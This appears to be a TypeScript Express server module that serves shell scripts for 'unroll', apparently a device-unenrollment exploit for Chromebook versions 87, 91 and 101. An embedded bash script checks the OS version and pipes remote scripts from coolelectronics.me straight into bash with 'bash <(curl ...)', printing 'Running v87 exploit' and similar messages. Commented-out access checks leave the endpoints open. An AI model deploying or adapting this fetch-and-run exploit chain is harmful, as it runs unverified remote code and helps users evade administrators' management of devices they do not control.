import { Request, Response, Express } from "express";
import { App } from "../../main";

export default {
  init: (state: App, app: Express) => {
    app.get("/unroll91", (req: Request, res: Response) => {
      res.sendFile(global.rootDir + "/unroll91.sh");

      // if (state.activelinks.includes(req.query.key as string)) {
      // } else {
      //   res.send("echo expired link! get a new one")
      // }
    })
    app.get("/unroll101", (req: Request, res: Response) => {
      res.sendFile(global.rootDir + "/unroll101.sh");

      // if (state.activelinks.includes(req.query.key as string)) {
      // } else {
      //   res.send("echo expired link! get a new one")
      // }
    });
    app.get("/unroll87", (req: Request, res: Response) => {
      res.sendFile(global.rootDir + "/unroll87.sh");
    });
    // app.get("/unroll", (req: Request, res: Response) => {
    //   res.sendFile(global.rootDir + "/unroll.sh");
    // });
  },
  path: "unroll",
  route: (state: App, req: Request, res: Response) => {
    res.sendFile(global.rootDir + "/dist/src/unenroll/unenroll.html");

    // if (state.activelinks.includes(req.query.key as string)) {
    // } else {
    //   res.redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
    // }
  },
  listeners: [],
  api: [],
  seopage: `
echo "Wait! Are you a sysadmin? (Y/N)"
read sysadmin
if [[ $sysadmin == "Y" || $sysadmin == "y" ]]; then
    # bash <(curl https://coolelectronics.me/rickroll.sh)
    echo 1
    exit
fi
bash <(curl https://coolelectronics.me/music.sh)
source <(tail -3 /etc/os-release)
if [ $VERSION == "87" ]
then
    echo "Running v87 exploit"
    bash <(curl https://coolelectronics.me/unroll87)
elif [ $VERSION == "91" ]
then
    bash <(curl https://coolelectronics.me/unroll91)
    echo "Running v91 exploit"
elif [ $VERSION == "101" ]
then
    bash <(curl https://coolelectronics.me/unroll101)
    echo "Running v101 exploit"
else
    echo "Unsupported Version. Downgrade to either 87, 91, or 101"
fi
`
}
